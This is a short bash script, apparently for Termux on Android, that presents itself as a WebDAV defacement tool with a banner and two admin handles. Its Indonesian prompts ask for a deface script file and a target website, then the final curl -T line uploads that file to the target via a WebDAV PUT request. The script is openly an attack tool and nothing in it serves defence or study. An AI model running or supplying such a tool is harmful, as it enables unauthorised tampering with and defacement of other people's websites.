blue='\033[34;1m'
green='\033[32;1m'  
purple='\033[35;1m'
cyan='\033[36;1m'
red='\033[31;1m'
white='\033[37;1m' 

toilet -f mono12 Webdav
echo $cyan "__________________________"
echo $green "Admin : @M4uL"
echo $green "Admin : @St1nky"
echo $cyan "__________________________"
echo $red "Taruh Script Deface Di Luar Folder"
echo $cyan "__________________________"
echo $green "Masukan Script Deface Anda"
read -p "C\>" Anda
echo $green "Masukan Target Web"
read -p "C\>" Web
curl -T /storage/emulated/0/$Anda $Web
